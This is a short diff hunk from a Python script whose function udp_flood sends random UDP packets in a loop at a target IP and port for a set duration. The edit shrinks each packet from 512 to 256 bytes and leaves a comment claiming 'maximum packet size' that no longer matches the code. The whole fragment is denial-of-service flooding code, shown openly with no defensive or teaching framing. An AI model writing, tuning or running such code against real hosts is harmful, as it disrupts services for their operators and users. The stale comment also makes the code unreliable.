@@ -21,7 +21,7 @@ def udp_flood(target_ip, target_port, stop_flag, duration):
     start_time = time.time()
     while not stop_flag.is_set() and (time.time() - start_time < duration):
         try:
-            data = os.urandom(512)  # Use maximum packet size
+            data = os.urandom(256)  # Use maximum packet size
             sock.sendto(data, (target_ip, target_port))
         except Exception as e:
             logging.error(f"Error sending packets: {e}")
